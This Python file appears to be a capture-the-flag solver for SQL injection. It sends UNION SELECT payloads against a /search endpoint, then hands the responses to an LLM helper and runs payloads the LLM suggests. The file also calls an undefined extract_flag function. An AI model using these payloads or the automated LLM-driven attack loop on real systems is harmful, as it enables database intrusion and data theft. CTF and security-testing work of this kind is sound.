"""Cassandra's Warning: Hybrid SQL Injection solver with LLM fallback."""
import requests
import re

class CassandraHybridSolver:
    """
    SQL Injection solver with LLM-powered fallback.

    Strategy:
    1. Try deterministic payloads (fast)
    2. If no flag found → use LLM to parse responses
    3. If still stuck → use LLM to suggest alternative endpoints/payloads
    """

    def __init__(self, agent):
        self.agent = agent
        self.base_url = agent.base_url
        self.vuln_type = "SQL Injection"

        # Import LLM helper only if available
        try:
            from llm_helper import LLMHelper
            self.llm = LLMHelper(agent)
        except:
            self.llm = None

    def solve(self):
        """Main solve with hybrid approach."""
        print("=== Cassandra (Hybrid): SQL Injection ===", flush=True)

        # Phase 1: Deterministic (fast)
        print("[1/3] Trying deterministic payloads...", flush=True)
        flag = self._deterministic_solve()
        if flag:
            return flag

        # Phase 2: LLM-assisted response parsing
        print("[2/3] Deterministic failed, using LLM to parse responses...", flush=True)
        flag = self._llm_parse_responses()
        if flag:
            return flag

        # Phase 3: LLM-guided pivoting
        if self.llm and self.llm.is_available():
            print("[3/3] Using LLM to suggest alternative strategies...", flush=True)
            flag = self.llm.iterative_solve(self, max_attempts=5)
            if flag:
                return flag

        print("All approaches exhausted", flush=True)
        return None

    def _deterministic_solve(self) -> str:
        """Standard deterministic SQL injection."""
        # Common flag table/column combinations
        flag_tables = ["flags", "flag", "secrets", "admin"]
        flag_columns = ["flag", "value", "secret", "data", "content"]

        for table in flag_tables:
            for col in flag_columns:
                payload = f"' UNION SELECT 1,{col},3 FROM {table}-- "
                try:
                    resp = requests.get(
                        f"{self.base_url}/search",
                        params={"name": payload},
                        timeout=10
                    )
                    print(f"  Try {table}.{col}: {resp.status_code}", flush=True)

                    # Standard pattern matching
                    flag = extract_flag(resp.text)
                    if flag:
                            return flag

                    # Store response for LLM fallback
                    if not hasattr(self, '_responses'):
                        self._responses = []
                    self._responses.append({
                        "payload": payload,
                        "status": resp.status_code,
                        "body": resp.text[:2000]
                    })

                except Exception as e:
                    print(f"  Error: {e}", flush=True)

        return None

    def _llm_parse_responses(self) -> str:
        """Use LLM to parse stored responses for hidden flags."""
        if not self.llm or not self.llm.is_available():
            return None

        if not hasattr(self, '_responses') or not self._responses:
            return None

        print("LLM analyzing successful responses for flag patterns...", flush=True)

        # Try LLM parsing on responses that returned 200
        for resp_data in self._responses:
            if resp_data["status"] == 200:
                flag = self.llm.analyze_response(resp_data["body"], "flag")
                if flag and "{" in flag:
                    return flag

        return None

    # Methods needed for LLM iterative solving
    def try_payload(self, endpoint: str, payload: str, method: str = "GET") -> str:
        """Execute a payload suggested by LLM."""
        try:
            url = f"{self.base_url}{endpoint}"

            if method == "GET":
                resp = requests.get(url, params={"name": payload}, timeout=10)
            elif method == "POST":
                resp = requests.post(url, json={"name": payload}, timeout=10)
            else:
                resp = requests.request(method, url, data=payload, timeout=10)

            print(f"  LLM-suggested attempt: {resp.status_code}", flush=True)
            return resp.text

        except Exception as e:
            return str(e)
